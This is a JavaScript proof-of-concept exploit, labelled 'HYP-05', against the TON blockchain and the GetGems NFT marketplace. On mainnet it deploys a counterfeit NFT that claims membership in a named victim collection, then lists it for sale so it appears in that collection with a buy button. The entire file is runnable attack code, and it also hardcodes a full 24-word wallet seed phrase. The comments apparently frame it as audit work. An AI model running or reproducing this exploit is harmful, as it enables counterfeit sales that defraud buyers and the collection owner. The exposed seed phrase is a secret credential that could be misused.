/**
 * HYP-05 PoC — Mainnet
 * Attacker deploys fake NFT with collection_address = REAL_COLLECTION (victim)
 * Then lists it on GetGems via v3 sale → appears in victim's collection UI
 *
 * Real collection (victim/auditor): EQCpgPOE7wu8zfpjPj7OeJ-qHwRGqLWgTu9Cef3v5_ksXaeg
 * Attacker wallet:                  EQCRcaW_DHaJaTJ1-bhWnElHap2xeOCYVEDKoRWyXSrUaokH
 */

const path  = require('path');
const fs    = require('fs');
const https = require('https');
const { compileFunc } = require('../nft-contracts/node_modules/@ton-community/func-js');
const { mnemonicToWalletKey } = require('../nft-contracts/node_modules/@ton/crypto');
const {
  WalletContractV4, TonClient, internal, toNano,
  Address, beginCell, contractAddress, Cell
} = require('../nft-contracts/node_modules/@ton/ton');

const ATTACKER_MNEMONIC = 'asthma black design brick oxygen cat that potato nurse umbrella quote snack bag color walnut jump stem cloth kit sand volcano secret cloth better';

// Victim's real collection — attacker will fake NFTs from it
const REAL_COLLECTION = Address.parse('EQCpgPOE7wu8zfpjPj7OeJ-qHwRGqLWgTu9Cef3v5_ksXaeg');

// GetGems mainnet marketplace
const GETGEMS_MARKETPLACE = Address.parse('0:584ee61b2dff0837116d0fcb5078d93964bcbe9c05fd6a141b1bfca5d6a43e18');

const OP_TRANSFER  = 0x5fcc3d14;
const BASE_URL     = 'https://raw.githubusercontent.com/mmski2002-eng/DELETEBOT/main/TON/GETGEMS/nft-metadata';
const SOURCES_DIR  = path.resolve(__dirname, '../contracts/sources');
const PATCH        = 'int builder_null?(builder b) asm "ISNULL";';
const FAKE_INDEX   = 99n; // index not minted by real collection

// v3 sale BOC (recognized by tonapi as nft_sale_getgems_v3)
const NftFixPriceSaleV3CodeBoc = 'te6cckECDAEAAqAAART/APSkE/S88sgLAQIBIAMCAH7yMO1E0NMA0x/6QPpA+kD6ANTTADDAAY4d+ABwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VTgXweCAP/+8vACAUgFBABXoDhZ2omhpgGmP/SB9IH0gfQBqaYAYGGh9IH0AfSB9ABhBCCMkrCgFYACqwECAs0IBgH3ZghA7msoAUmCgUjC+8uHCJND6QPoA+kD6ADBTkqEhoVCHoRagUpBwgBDIywVQA88WAfoCy2rJcfsAJcIAJddJwgKwjhdQRXCAEMjLBVADzxYB+gLLaslx+wAQI5I0NOJacIAQyMsFUAPPFgH6AstqyXH7AHAgghBfzD0UgcAlsjLHxPLPyPPFlADzxbKAIIJycOA+gLKAMlxgBjIywUmzxZw+gLLaszJgwb7AHFVUHAHyMsAFssfUATPFljPFgHPFgH6AszLAMntVAP10A6GmBgLjYSS+CcH0gGHaiaGmAaY/9IH0gfSB9AGppgBgYOCmE44BgAEwthGmP6Z+lVW8Q4AHxgRDAgRXdFOAA2CnT44LYTwhWL4ZqGGhpg+oYAP2AcBRgAPloyhJrpOEBWfGBHByUYABOGxuIHCOyiiGYOHgC8BRgAMCwoJAC6SXwvgCMACmFVEECQQI/AF4F8KhA/y8ACAMDM5OVNSxwWSXwngUVHHBfLh9IIQBRONkRW68uH1BPpAMEBmBXAHyMsAFssfUATPFljPFgHPFgH6AszLAMntVADYMTc4OYIQO5rKABi+8uHJU0bHBVFSxwUVsfLhynAgghBfzD0UIYAQyMsFKM8WIfoCy2rLHxXLPyfPFifPFhTKACP6AhPKAMmAQPsAcVBmRRUEcAfIywAWyx9QBM8WWM8WAc8WAfoCzMsAye1UM/Vflw==';
const SALE_V3_CODE = Cell.fromBase64(NftFixPriceSaleV3CodeBoc);

const client = new TonClient({ endpoint: 'https://toncenter.com/api/v2/jsonRPC' });

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function fmt(n) { return (Number(n) / 1e9).toFixed(6); }

async function withRetry(fn, max = 5) {
  for (let i = 1; i <= max; i++) {
    try { return await fn(); } catch (e) {
      if (i < max) { await sleep(e.message?.includes('429') ? 3000 * i : 2000); continue; }
      throw e;
    }
  }
}

function httpsGet(url) {
  return new Promise((res, rej) => {
    https.get(url, { headers: { Accept: 'application/json' } }, r => {
      let d = '';
      r.on('data', c => d += c);
      r.on('end', () => { try { res(JSON.parse(d)); } catch { res({ raw: d.slice(0, 400) }); } });
    }).on('error', rej);
  });
}

function makeOffchainContent(url) {
  return beginCell().storeUint(0x01, 8).storeBuffer(Buffer.from(url)).endCell();
}

async function compile(targets) {
  const r = await compileFunc({
    targets,
    sources: p => p === 'patch.fc' ? PATCH : fs.readFileSync(path.join(SOURCES_DIR, p), 'utf8'),
  });
  if (r.status === 'error') throw new Error('FunC: ' + r.message);
  return Cell.fromBase64(r.codeBoc);
}

function buildV3SaleData(opts) {
  const feesCell = beginCell()
    .storeAddress(opts.marketplaceFeeAddress)
    .storeCoins(opts.marketplaceFee)
    .storeAddress(opts.royaltyAddress)
    .storeCoins(opts.royaltyAmount)
    .endCell();

  return beginCell()
    .storeBit(0)
    .storeUint(opts.createdAt, 32)
    .storeAddress(opts.marketplaceAddress)
    .storeAddress(opts.nftAddress)
    .storeAddress(null)              // nft_owner_address null before transfer
    .storeCoins(opts.fullPrice)
    .storeRef(feesCell)
    .storeBit(0)
    .endCell();
}

async function main() {
  const key    = await mnemonicToWalletKey(ATTACKER_MNEMONIC.split(/\s+/));
  const wallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 });
  const atk    = client.open(wallet);
  const atkAddr = wallet.address;

  console.log('=== HYP-05 Mainnet PoC ===');
  console.log('Attacker:', atkAddr.toString({ bounceable: true }));
  console.log('Target collection:', REAL_COLLECTION.toString({ bounceable: true }));

  const bal = await withRetry(() => client.getContractState(atkAddr));
  console.log('Balance:', fmt(BigInt(bal.balance || '0')), 'TON\n');

  // 1. Compile NFT item only (no collection needed)
  console.log('[1] Compile NFT item...');
  const NFT_CODE = await compile(['imports/stdlib.fc', 'op-codes.fc', 'params.fc', 'patch.fc', 'nft-item.fc']);
  console.log('    OK\n');

  // 2. Build fake NFT data — pre-initialized with:
  //    collection_address = REAL_COLLECTION (victim's real collection!)
  //    owner_address      = attacker
  //    content            = our metadata
  console.log('[2] Build fake NFT data...');
  const nftContent = makeOffchainContent(`${BASE_URL}/0.json`);
  const nftData = beginCell()
    .storeUint(FAKE_INDEX, 64)
    .storeAddress(REAL_COLLECTION)   // <-- victim's real collection
    .storeAddress(atkAddr)           // owner = attacker (pre-initialized)
    .storeRef(nftContent)
    .endCell();

  const nftAddr = contractAddress(0, { code: NFT_CODE, data: nftData });
  console.log('    Fake NFT address:', nftAddr.toString({ bounceable: true }));
  console.log('    NFT claims to be in:', REAL_COLLECTION.toString({ bounceable: true }));
  console.log('    NFT index:', FAKE_INDEX.toString(), '\n');

  // 3. Deploy fake NFT
  const nftState = await withRetry(() => client.getContractState(nftAddr));
  if (nftState.state !== 'active') {
    console.log('[3] Deploying fake NFT...');
    const seq = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq, secretKey: key.secretKey,
      messages: [internal({
        to: nftAddr, value: toNano('0.05'), bounce: false,
        init: { code: NFT_CODE, data: nftData },
      })],
    }));
    console.log('    TX sent, waiting 20s...');
    await sleep(20000);
    const st = await withRetry(() => client.getContractState(nftAddr));
    console.log('    state:', st.state);
  } else {
    console.log('[3] Fake NFT already deployed');
  }

  // Verify NFT data on-chain
  console.log('\n[3.1] Verify NFT get_nft_data...');
  try {
    const nftR = await withRetry(() => client.runMethod(nftAddr, 'get_nft_data'));
    const init    = nftR.stack.readNumber();
    const index   = nftR.stack.readBigNumber();
    const collCell = nftR.stack.readCell();
    const ownerCell = nftR.stack.readCell();
    const coll = collCell.beginParse().loadAddress();
    const owner = ownerCell.beginParse().loadAddress();
    console.log('    init:', init, '(1 = initialized)');
    console.log('    index:', index.toString());
    console.log('    collection_address:', coll.toString({ bounceable: true }));
    console.log('    owner_address:', owner.toString({ bounceable: true }));
    console.log('    collection matches real?', coll.toRawString() === REAL_COLLECTION.toRawString() ? '✅ YES' : '❌ NO');
  } catch (e) {
    console.log('    get_nft_data error:', e.message);
  }

  // 4. Deploy v3 sale
  const ts = Math.floor(Date.now() / 1000);
  const saleData = buildV3SaleData({
    marketplaceAddress:    GETGEMS_MARKETPLACE,
    nftAddress:            nftAddr,
    fullPrice:             toNano('10'),           // 10 TON asking price (looks real)
    marketplaceFeeAddress: GETGEMS_MARKETPLACE,
    marketplaceFee:        toNano('0.5'),           // 5%
    royaltyAddress:        atkAddr,
    royaltyAmount:         toNano('0'),
    createdAt:             ts,
  });
  const saleAddr = contractAddress(0, { code: SALE_V3_CODE, data: saleData });
  console.log('\n[4] v3 Sale address:', saleAddr.toString({ bounceable: true }));

  const saleState = await withRetry(() => client.getContractState(saleAddr));
  if (saleState.state !== 'active') {
    console.log('    Deploying sale...');
    await sleep(500);
    const seq2 = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq2, secretKey: key.secretKey,
      messages: [internal({
        to: saleAddr, value: toNano('0.05'), bounce: false,
        init: { code: SALE_V3_CODE, data: saleData },
      })],
    }));
    console.log('    TX sent, waiting 20s...');
    await sleep(20000);
    const st2 = await withRetry(() => client.getContractState(saleAddr));
    console.log('    state:', st2.state);
  } else {
    console.log('    Sale already deployed');
  }

  // Check sale interface
  const saleAcc = await httpsGet(`https://tonapi.io/v2/accounts/${saleAddr.toRawString()}`);
  console.log('    Sale interfaces:', saleAcc.interfaces);

  // 5. Transfer fake NFT → sale
  console.log('\n[5] Transfer fake NFT → v3 sale...');
  const nftR2 = await withRetry(() => client.runMethod(nftAddr, 'get_nft_data'));
  nftR2.stack.readNumber();
  nftR2.stack.readBigNumber();
  nftR2.stack.readCell();
  const ownerNow = nftR2.stack.readCell().beginParse().loadAddress();
  console.log('    Current NFT owner:', ownerNow.toString({ bounceable: true }));

  if (ownerNow.toRawString() === saleAddr.toRawString()) {
    console.log('    Already transferred to sale ✅');
  } else {
    const transferBody = beginCell()
      .storeUint(OP_TRANSFER, 32).storeUint(0, 64)
      .storeAddress(saleAddr)
      .storeAddress(atkAddr)
      .storeBit(0)
      .storeCoins(toNano('0.05'))
      .storeBit(0)
      .endCell();

    await sleep(500);
    const seq3 = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq3, secretKey: key.secretKey,
      messages: [internal({ to: nftAddr, value: toNano('0.12'), bounce: true, body: transferBody })],
    }));
    console.log('    TX sent, waiting 25s...');
    await sleep(25000);
  }

  // 6. Final tonapi checks
  console.log('\n[6] tonapi mainnet checks...');
  await sleep(5000);
  const [nftResp, saleResp] = await Promise.all([
    httpsGet(`https://tonapi.io/v2/nfts/${nftAddr.toRawString()}`),
    httpsGet(`https://tonapi.io/v2/accounts/${saleAddr.toRawString()}`),
  ]);

  console.log('\n    NFT collection:', nftResp.collection?.address || 'N/A');
  console.log('    NFT collection name:', nftResp.collection?.name || 'N/A');
  console.log('    NFT for sale:', JSON.stringify(nftResp.sale));
  console.log('    NFT owner:', nftResp.owner?.address || 'N/A');
  console.log('    Sale interfaces:', saleResp.interfaces);
  console.log('    Sale methods:', saleResp.get_methods);

  console.log('\n=== LINKS ===');
  const nftRaw  = nftAddr.toRawString();
  const saleRaw = saleAddr.toRawString();
  const collRaw = REAL_COLLECTION.toRawString();
  console.log('NFT tonscan:       https://tonscan.org/address/' + nftRaw);
  console.log('Sale tonscan:      https://tonscan.org/address/' + saleRaw);
  console.log('NFT tonapi:        https://tonapi.io/v2/nfts/' + nftRaw);
  console.log('GetGems NFT:       https://getgems.io/nft/' + nftAddr.toString({ bounceable: true }));
  console.log('GetGems collection:', 'https://getgems.io/collection/' + REAL_COLLECTION.toString({ bounceable: true }));
  console.log('\nExpected result: fake NFT appears in victim\'s collection on GetGems with BUY button');
}

main().catch(console.error);
